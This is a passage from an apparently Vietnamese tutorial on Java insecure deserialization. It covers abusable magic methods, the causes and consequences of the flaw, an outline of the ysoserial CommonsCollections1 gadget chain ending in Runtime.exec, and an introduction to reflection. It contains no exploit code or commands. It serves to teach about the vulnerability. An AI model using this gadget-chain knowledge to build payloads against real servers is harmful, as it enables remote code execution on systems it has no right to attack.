      </div><p class="part" data-startline="320" data-endline="320" data-position="22444" data-size="0"><span data-position="22444" data-size="22">Các magic method khác:</span></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="321" data-endline="330" data-infoprefix-length="8" data-position="22467"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="markdown hljs"><span class="hljs-operator">|</span> Phương thức               <span class="hljs-operator">|</span> Điều kiện kích hoạt                                        <span class="hljs-operator">|</span> Nguy cơ tiềm ẩn                                                         <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> <span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span> <span class="hljs-operator">|</span> <span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span> <span class="hljs-operator">|</span> <span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> finalize()                <span class="hljs-operator">|</span> JVM gọi khi object bị GC (garbage collected)               <span class="hljs-operator">|</span> Có thể ẩn payload thực thi muộn, hoặc gây <span class="hljs-keyword">memory</span> leak                   <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> toString()                <span class="hljs-operator">|</span> Gọi khi in object, ghi log, debug                          <span class="hljs-operator">|</span> Có thể thực thi code khi object bị ghi log hoặc hiển thị                <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> equals() <span class="hljs-operator">/</span> hashCode()     <span class="hljs-operator">|</span> Gọi khi so sánh object, dùng làm key trong Map<span class="hljs-operator">/</span>Set         <span class="hljs-operator">|</span> Có thể bị kích hoạt khi deserialize object đưa vào tập dữ liệu          <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> run() <span class="hljs-operator">/</span> call()            <span class="hljs-operator">|</span> Gọi khi object được dùng trong `Thread`, `ExecutorService` <span class="hljs-operator">|</span> Payload có thể thực thi khi object được submit                          <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> ClassName()               <span class="hljs-operator">|</span> Chỉ được gọi khi `<span class="hljs-keyword">new</span>`, <span class="hljs-operator">*</span><span class="hljs-operator">*</span>không được gọi khi deserialize<span class="hljs-operator">*</span><span class="hljs-operator">*</span> <span class="hljs-operator">|</span> Nhưng đôi khi vẫn bị hiểu nhầm là magic method nếu dùng gadget có `<span class="hljs-keyword">new</span>` <span class="hljs-operator">|</span>

</code></pre>
      </div><h3 class="part" data-startline="332" data-endline="332" id="3-Insecure-Deserialization-là-gì" data-id="3-Insecure-Deserialization-là-gì"><a class="anchor hidden-xs" href="https://hackmd.io/@nhat015/HktihBmLxl#3-Insecure-Deserialization-l%C3%A0-g%C3%AC" title="3-Insecure-Deserialization-là-gì" data-size="33" data-position="23644" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="23644" data-size="33">3. Insecure Deserialization là gì</span></h3><p class="part" data-startline="333" data-endline="333" data-position="23678" data-size="0"><span data-position="23678" data-size="276">Insecure Deserialization (Giải tuần tự không an toàn) hay còn gọi là Object injection là một lỗ hổng bảo mật xảy ra khi ứng dụng chấp nhận dữ liệu được serialize (tuần tự hóa) từ người dùng mà không xác minh, kiểm soát hoặc lọc hợp lệ trước khi deserialize (giải tuần tự hóa).</span></p><p class="part" data-startline="335" data-endline="335" data-position="23956" data-size="0"><span data-position="23956" data-size="221">Nói cách khác, kẻ tấn công có thể gửi một object đã bị chỉnh sửa hoặc crafted (tùy chỉnh độc hại) đến server. Nếu ứng dụng deserialize dữ liệu đó mà không kiểm tra kỹ, code nguy hiểm bên trong object có thể được thực thi.</span></p><p class="part" data-startline="337" data-endline="337" data-position="24179" data-size="0"><span data-position="24179" data-size="10">Tham khảo:</span><a href="https://portswigger.net/web-security/deserialization#what-is-insecure-deserialization" target="_blank" rel="noopener"><span data-position="24190" data-size="11">portswigger</span></a><span data-position="24290" data-size="2">, </span><a href="https://owasp.org/www-community/vulnerabilities/Insecure_Deserialization" target="_blank" rel="noopener"><span data-position="24292" data-size="5">owasp</span></a><span data-position="24373" data-size="2">, </span><a href="https://www.wallarm.com/what/a8-insecure-deserialization-2017-owasp" target="_blank" rel="noopener"><span data-position="24375" data-size="39">A8: Insecure Deserialization 2017 OWASP</span></a></p><h3 class="part" data-startline="339" data-endline="339" id="4-Lý-do-lỗ-hổng-Insecure-Deserialization-phát-sinh" data-id="4-Lý-do-lỗ-hổng-Insecure-Deserialization-phát-sinh"><a class="anchor hidden-xs" href="https://hackmd.io/@nhat015/HktihBmLxl#4-L%C3%BD-do-l%E1%BB%97-h%E1%BB%95ng-Insecure-Deserialization-ph%C3%A1t-sinh" title="4-Lý-do-lỗ-hổng-Insecure-Deserialization-phát-sinh" data-size="52" data-position="24490" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="24490" data-size="52">4. Lý do lỗ hổng Insecure Deserialization phát sinh?</span></h3><ol class="part" data-startline="340" data-endline="353" data-position="24543" data-size="0" style="padding-left: 2em;">
<li class="" data-startline="340" data-endline="342" data-position="24546" data-size="0"><span data-position="24546" data-size="64">Tin tưởng dữ liệu không kiểm soát được (Trusting Untrusted Data)</span><br>
<span data-position="24611" data-size="19">Rất nhiều ứng dụng </span><strong data-position="24630" data-size="0"><span data-position="24632" data-size="11">deserialize</span></strong><span data-position="24645" data-size="69"> dữ liệu do client gửi lên mà không kiểm tra trước. Theo PortSwigger:</span><code data-position="24715" data-size="154">“Insecure deserialization typically arises because there is a general lack of understanding of how dangerous deserializing user-controllable data can be.”</code><br>
<span data-position="24871" data-size="135">Các developer thường tin rằng việc lập trình bằng ngôn ngữ có serialize nhị phân thì không dễ bị tấn công, nhưng thực tế không như vậy.</span></li>
<li class="" data-startline="343" data-endline="345" data-position="25010" data-size="0"><span data-position="25010" data-size="10">Quá trình </span><strong data-position="25020" data-size="0"><span data-position="25022" data-size="11">deserialize</span></strong><span data-position="25035" data-size="33"> gọi tự động các method nguy hiểm</span><br>
<span data-position="25069" data-size="55">Ngay khi JVM bắt đầu deserialize, các magic method như </span><code data-position="25125" data-size="12">readObject()</code><span data-position="25139" data-size="2">, </span><code data-position="25141" data-size="13">readResolve()</code><span data-position="25156" data-size="2">, </span><code data-position="25158" data-size="14">writeReplace()</code><span data-position="25173" data-size="66"> có thể được gọi — trước khi bất cứ validation nào được thực hiện.</span><br>
<span data-position="25240" data-size="8">Cú pháp </span><code data-position="25249" data-size="13">readResolve()</code><span data-position="25263" data-size="6"> hoặc </span><code data-position="25270" data-size="12">readObject()</code><span data-position="25283" data-size="29"> chứa logic tùy chỉnh có thể </span><strong data-position="25312" data-size="0"><span data-position="25314" data-size="19">chứa lệnh nguy hiểm</span></strong><span data-position="25336" data-size="16">, và nó sẽ chạy </span><strong data-position="25351" data-size="0"><span data-position="25353" data-size="21">ngay tại thời điểm đó</span></strong><span data-position="25377" data-size="1">.</span></li>
<li class="" data-startline="346" data-endline="348" data-position="25381" data-size="0"><span data-position="25381" data-size="70">Thư viện bên thứ 3 chứa gadget sẵn sàng lợi dụng (Gadget availability)</span><br>
<span data-position="25452" data-size="23">Các framework Java như </span><strong data-position="25475" data-size="0"><span data-position="25477" data-size="30">Apache Commons, Spring, Groovy</span></strong><span class="smartypants" data-position="25509" data-size="3">…</span><span data-position="25512" data-size="99"> chứa sẵn các class có các method có thể được dùng trong gadget chain để kích hoạt payload – ví dụ </span><code data-position="25612" data-size="27">InvokerTransformer.invoke()</code><span data-position="25641" data-size="1">.</span><br>
<span data-position="25642" data-size="62">Do môi trường phụ thuộc đa dạng, attacker có thể tìm class có </span><code data-position="25705" data-size="12">readObject()</code><span data-position="25718" data-size="29"> thực thi và chain thành RCE.</span></li>
<li class="" data-startline="349" data-endline="350" data-position="25751" data-size="0"><span data-position="25751" data-size="50">Khó kiểm soát whitelist/validation sau deserialize</span><br>
<span data-position="25802" data-size="80">Dù có dùng whitelist, việc kiểm soát tất cả các class hoặc logic phức tạp trong </span><code data-position="25883" data-size="12">readObject()</code><span data-position="25896" data-size="36"> rất dễ bị bỏ sót. Theo PortSwigger:</span><code data-position="25933" data-size="159">“Ideally, user input should never be deserialized at all… it is virtually impossible to implement validation or sanitization to account for every eventuality.”</code></li>
<li class="" data-startline="351" data-endline="353" data-position="26097" data-size="0"><span data-position="26097" data-size="48">Lỗi từ việc phụ thuộc vào serialization nhị phân</span><br>
<span data-position="26146" data-size="165">Các ngôn ngữ như Java, PHP (serialize), Python (pickle) dùng nhị phân, thường bị tin tưởng là “bí mật” khó đọc hoặc thay đổi. Nhưng attacker có thể dùng công cụ như </span><strong data-position="26311" data-size="0"><span data-position="26313" data-size="15">ysoserial, Burp</span></strong><span data-position="26330" data-size="40"> để craft payload nhị phân rất dễ dàng .</span></li>
</ol><p class="part" data-startline="354" data-endline="354" data-position="26372" data-size="0"><span data-position="26372" data-size="10">Tham khảo:</span><a href="https://snynr.medium.com/understanding-insecure-deserialization-risks-and-mitigations-e726dcf624e7" target="_blank" rel="noopener"><span data-position="26383" data-size="10">Saniye Nur</span></a><span data-position="26495" data-size="2">, </span><a href="https://www.appsecengineer.com/blog/what-is-insecure-deserialization" target="_blank" rel="noopener"><span data-position="26497" data-size="13">Abhay Bhargav</span></a></p><h3 class="part" data-startline="356" data-endline="356" id="5-Hậu-quả-của-Insecure-Deserialization" data-id="5-Hậu-quả-của-Insecure-Deserialization"><a class="anchor hidden-xs" href="https://hackmd.io/@nhat015/HktihBmLxl#5-H%E1%BA%ADu-qu%E1%BA%A3-c%E1%BB%A7a-Insecure-Deserialization" title="5-Hậu-quả-của-Insecure-Deserialization" data-size="39" data-position="26587" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="26587" data-size="39">5. Hậu quả của Insecure Deserialization</span></h3><ol class="part" data-startline="357" data-endline="366" data-position="26627" data-size="0" style="padding-left: 2em;">
<li class="" data-startline="357" data-endline="358" data-position="26630" data-size="0"><span data-position="26630" data-size="27">Remote Code Execution (RCE)</span><br>
<span data-position="26658" data-size="92">Khi ứng dụng deserialize dữ liệu từ nguồn không kiểm soát, attacker có thể gửi payload chứa </span><strong data-position="26750" data-size="0"><span data-position="26752" data-size="12">gadget chain</span></strong><span data-position="26767" data-size="27">, qua các magic method như </span><code data-position="26794" data-size="12">readObject()</code><span data-position="26807" data-size="94"> để thực thi mã tùy ý. Theo OWASP, đây là một trong các hậu quả nghiêm trọng nhất của lỗi này.</span></li>
<li class="" data-startline="359" data-endline="360" data-position="26906" data-size="0"><span data-position="26906" data-size="23">Denial-of-Service (DoS)</span><br>
<strong data-position="26930" data-size="0"><span data-position="26932" data-size="15">Deserialization</span></strong><span data-position="26949" data-size="172"> phức tạp có thể tốn tài nguyên đáng kể. Attacker có thể gửi một đối tượng phức tạp hoặc mảng lồng nhau không hồi kết để khiến server bị tắc nghẽn, crash hoặc ngắt dịch vụ.</span></li>
<li class="" data-startline="361" data-endline="362" data-position="27125" data-size="0"><span data-position="27125" data-size="33">Privilege Escalation (tăng quyền)</span><br>
<span data-position="27159" data-size="59">Dữ liệu serialized chứa các trường nhạy cảm như role, token</span><span class="smartypants" data-position="27218" data-size="3">…</span><span data-position="27221" data-size="66"> nếu bị chỉnh sửa, attacker có thể tự nâng quyền, ví dụ chuyển từ </span><code data-position="27288" data-size="13">isAdmin=false</code><span data-position="27302" data-size="37"> thành true để truy cập admin panel .</span></li>
<li class="" data-startline="363" data-endline="364" data-position="27343" data-size="0"><span data-position="27343" data-size="42">Logic Manipulation &amp; Access Control Bypass</span><br>
<span data-position="27386" data-size="159">Object injection có thể thay đổi hành vi bên trong ứng dụng. Ví dụ, thuộc tính avatar_link nằm trong session cookie có thể được chỉnh sửa để xóa file quan trọng</span></li>
<li class="" data-startline="365" data-endline="366" data-position="27550" data-size="0"><span data-position="27550" data-size="39">Object Injection &amp; Tài nguyên trái phép</span><br>
<span data-position="27590" data-size="165">Attacker có thể inject các object không mong muốn vào ứng dụng, có thể gây rò rỉ dữ liệu, kích hoạt chức năng chưa public, hoặc phá vỡ logic luồng xử lý của ứng dụng</span></li>
</ol><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="367" data-endline="376" data-infoprefix-length="8" data-position="27756"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="markdown hljs"><span class="hljs-operator">|</span> Hậu quả                           <span class="hljs-operator">|</span> Mô tả                                                    <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> <span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span> <span class="hljs-operator">|</span> <span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> RCE                               <span class="hljs-operator">|</span> Cho phép attacker thực thi mã tùy ý trên máy chủ         <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> DoS                               <span class="hljs-operator">|</span> Gây treo server hoặc phá hủy dịch vụ                     <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> Privilege Escalation              <span class="hljs-operator">|</span> Từ user thường lên admin, hoặc vượt rào hạn mức truy cập <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> Bypass Access Control <span class="hljs-operator">/</span> Logic     <span class="hljs-operator">|</span> Thay đổi logic <span class="hljs-operator">/</span> bypass chức năng bảo mật ứng dụng       <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> Object Injection                  <span class="hljs-operator">|</span> Gửi object trái phép để khai thác tính năng <span class="hljs-operator">/</span> gây rò rỉ  <span class="hljs-operator">|</span>

</code></pre>
      </div><h3 class="part" data-startline="377" data-endline="377" id="6-Gadget-chain-là-gì" data-id="6-Gadget-chain-là-gì"><a class="anchor hidden-xs" href="https://hackmd.io/@nhat015/HktihBmLxl#6-Gadget-chain-l%C3%A0-g%C3%AC" title="6-Gadget-chain-là-gì" data-size="22" data-position="28456" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="28456" data-size="22">6. Gadget chain là gì?</span></h3><p class="part" data-startline="378" data-endline="378" data-position="28479" data-size="0"><strong data-position="28479" data-size="0"><span data-position="28481" data-size="12">Gadget Chain</span></strong><span data-position="28495" data-size="27"> (hay chuỗi gadget) là một </span><strong data-position="28522" data-size="0"><span data-position="28524" data-size="27">dãy gọi phương thức tự động</span></strong><span data-position="28553" data-size="38"> được kích hoạt chính trong quá trình </span><strong data-position="28591" data-size="0"><span data-position="28593" data-size="15">deserialization</span></strong><span data-position="28611" data-size="80">. Khi attacker gửi một đối tượng được crafted đúng cách đến ứng dụng có lỗ hổng </span><em data-position="28690" data-size="0"><span data-position="28691" data-size="24">Insecure Deserialization</span></em><span data-position="28717" data-size="98">, JVM sẽ tự động gọi một loạt phương thức trên các class có sẵn trong classpath của ứng dụng – từ </span><strong data-position="28814" data-size="0"><span data-position="28816" data-size="6">source</span></strong><span data-position="28824" data-size="12"> (thường là </span><code data-position="28839" data-size="13">readObject())</code><span data-position="28855" data-size="17"> đến sink (ví dụ </span><code data-position="28875" data-size="13">Runtime.exec)</code><span data-position="28892" data-size="34">, tạo nên chuỗi tương tác dẫn đến </span><strong data-position="28925" data-size="0"><span data-position="28927" data-size="27">Remote Code Execution (RCE)</span></strong><span data-position="28956" data-size="23"> hoặc các hậu quả khác.</span></p><blockquote class="part" data-startline="380" data-endline="380" style="border-left-color: rgb(255, 0, 0);">
<p data-position="28983" data-size="0"><span class="color" data-color="#ff0000" data-position="0" data-size="15"></span><span data-position="28998" data-size="44">Đây không phải là một lớp độc lập, mà là sự </span><strong data-position="29042" data-size="0"><span data-position="29044" data-size="33">tận dụng lại các đoạn code sẵn có</span></strong><span data-position="29079" data-size="10"> – gọi là </span><strong data-position="29089" data-size="0"><span data-position="29091" data-size="7">gadgets</span></strong><span data-position="29100" data-size="56"> – kết nối thành chuỗi (chain) để đạt mục đích tấn công.</span></p>
</blockquote><p class="part" data-startline="383" data-endline="383" data-position="29159" data-size="0"><span data-position="29159" data-size="66">Ở đây mình sẽ ví dụ một chuỗi gadget điển hình trong ysoserial là </span><strong data-position="29225" data-size="0"><span data-position="29227" data-size="19">CommonsCollections1</span></strong><span data-position="29249" data-size="1">:</span></p><blockquote class="part" data-startline="384" data-endline="388" style="border-left-color: rgb(30, 144, 255);">
<p data-position="29252" data-size="0"><span class="color" data-color="#1e90ff" data-position="0" data-size="15"></span></p>
<ul data-position="29270" data-size="0">
<li class="" data-startline="385" data-endline="385" data-position="29272" data-size="0"><span data-position="29274" data-size="11">Bắt đầu từ </span><code data-position="29286" data-size="12">readObject()</code><span data-position="29303" data-size="14"> lớp Hashtable</span></li>
<li class="" data-startline="386" data-endline="386" data-position="29319" data-size="0"><span data-position="29322" data-size="11">Chuyển tới </span><code data-position="29333" data-size="20">AbstractMap.equals()</code></li>
<li class="" data-startline="387" data-endline="387" data-position="29360" data-size="0"><span data-position="29364" data-size="21">Rồi qua LazyMap.get()</span></li>
<li class="" data-startline="388" data-endline="388" data-position="29385" data-size="0"><span data-position="29390" data-size="14">Cuối cùng gọi </span><code data-position="29402" data-size="30">InvokerTransformer.transform()</code><span data-position="29440" data-size="12"> → thực thi </span><code data-position="29450" data-size="14">Runtime.exec()</code></li>
</ul>
</blockquote><p class="part" data-startline="390" data-endline="390" data-position="29469" data-size="0"><span data-position="29469" data-size="139">Vì đây là lỗi chúng ta sử dụng các đoạn code có sẵn trong ứng dụng/library nên lúc này sẽ gây ra nhiều nguy hiểm tiềm tàng cho hệ thống đó.</span></p><blockquote class="part" data-startline="391" data-endline="394" style="border-left-color: rgb(255, 0, 0);">
<p data-position="29611" data-size="0"><span class="color" data-color="#ff0000" data-position="0" data-size="15"></span><strong data-position="29626" data-size="0"><span data-position="29628" data-size="40">Nguy cơ tiềm tàng của lỗi này nằm ở chỗ:</span></strong></p>
<ul data-position="29673" data-size="0">
<li class="" data-startline="392" data-endline="392" data-position="29675" data-size="0"><span data-position="29677" data-size="77">Không cần class custom nguy hiểm: Chỉ dựa trên class có sẵn trong dependency.</span></li>
<li class="" data-startline="393" data-endline="393" data-position="29757" data-size="0"><span data-position="29761" data-size="99">Phát hiện nhanh chóng: Hàng loạt gadget chain đã được công khai (CommonsCollections, Spring, Groovy</span><span class="smartypants" data-position="29856" data-size="3">…</span><span data-position="29863" data-size="34">) và tích hợp sẵn trong ysoserial.</span></li>
<li class="" data-startline="394" data-endline="394" data-position="29898" data-size="0"><span data-position="29904" data-size="94">Khó ngăn chặn: Validator thông thường không thể xét hết tất cả các chain có thể được xây dựng.</span></li>
</ul>
</blockquote><p class="part" data-startline="396" data-endline="396" data-position="29994" data-size="0"><span data-position="29994" data-size="10">Tham khảo:</span><a href="https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet" target="_blank" rel="noopener"><span data-position="30005" data-size="32">Java-Deserialization-Cheat-Sheet</span></a><span data-position="30100" data-size="2">, </span><a href="https://www.synacktiv.com/en/publications/java-deserialization-tricks" target="_blank" rel="noopener"><span data-position="30102" data-size="9">synacktiv</span></a></p><h3 class="part" data-startline="398" data-endline="398" id="7-Java-Reflection" data-id="7-Java-Reflection"><a class="anchor hidden-xs" href="https://hackmd.io/@nhat015/HktihBmLxl#7-Java-Reflection" title="7-Java-Reflection" data-size="18" data-position="30189" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="30189" data-size="18">7. Java Reflection</span></h3><p class="part" data-startline="399" data-endline="402" data-position="30208" data-size="0"><span data-position="30208" data-size="137">Tiếp đến chúng ta đến với một phần quan trọng không kém khi nói đến lỗi Java Deserialization mà không thể không nhắc tới Reflection. Vậy </span><strong data-position="30345" data-size="0"><span data-position="30347" data-size="10">Reflection</span></strong><span data-position="30359" data-size="25"> là gì và có tác dụng gì.</span><br>
<span data-position="30385" data-size="27">Đầu tiên nói về định nghĩa </span><strong data-position="30412" data-size="0"><span data-position="30414" data-size="10">Reflection</span></strong><span data-position="30427" data-size="2">, </span><strong data-position="30428" data-size="0"><span data-position="30430" data-size="10">Reflection</span></strong><span data-position="30442" data-size="37"> trong Java cho phép chương trình tự </span><strong data-position="30479" data-size="0"><span data-position="30481" data-size="21">quan sát (introspect)</span></strong><span data-position="30504" data-size="4"> và </span><strong data-position="30508" data-size="0"><span data-position="30510" data-size="16">can thiệp nội bộ</span></strong><span data-position="30528" data-size="78"> của các lớp, phương thức, trường (fields) ngay cả khi chúng được khai báo là </span><strong data-position="30606" data-size="0"><span data-position="30608" data-size="31">private hoặc ở các package khác</span></strong><span data-position="30642" data-size="7">.(Theo </span><a href="https://owasp.org/www-chapter-stuttgart/assets/slides/2024-12-10_Exploiting_deserialization_vulnerabilities_in_recent_Java_versions.pdf?utm_source=chatgpt.com" target="_blank" rel="noopener"><span data-position="30649" data-size="6">Oracle</span></a><span data-position="30817" data-size="94">, reflection cho phép “examine or introspect upon itself, and manipulate internal properties”)</span><br>
